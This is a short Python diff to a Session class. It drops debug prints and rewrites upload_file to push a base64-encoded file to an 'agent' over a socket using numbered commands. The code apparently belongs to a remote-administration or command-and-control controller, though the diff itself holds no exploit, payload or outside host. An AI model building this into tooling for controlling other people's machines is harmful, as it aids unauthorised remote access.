@@ -68,13 +68,7 @@ class Session():
             return 1
 
         self.channel.sendall("22|"+agent_id)
-        
-        print("Sent request")
         num = int(self.channel.recv(8192).decode())
-        
-        print("Got number %d " % num)
-        print("Sending ready")
-        
         self.channel.send("rd")    
         for i in range(num):
             cnt = 0
@@ -111,7 +105,20 @@ class Session():
         print("Complete")     
 
     def upload_file(self, agent_id, file):
-        self.channel.sendall("23|" + file.filename)
+        print("[ ] Doing upload")
+        self.channel.sendall("23|" + agent_id)
+        self.channel.recv(3)
+        print(file.filename)
+        self.channel.send(file.filename)
+        self.channel.recv(3)
+        
+        buff = b64.encodebytes(file.data).replace(b'\n', b'')
+        
+        self.channel.send(str(len(buff)))
+        self.channel.recv(3)
+        self.channel.send(buff)
+        ret = self.channel.recv(3)
+        print("[+] Success")
     
     def do_download(self, agent_id, path):
         print("[ ] Doing Download...")
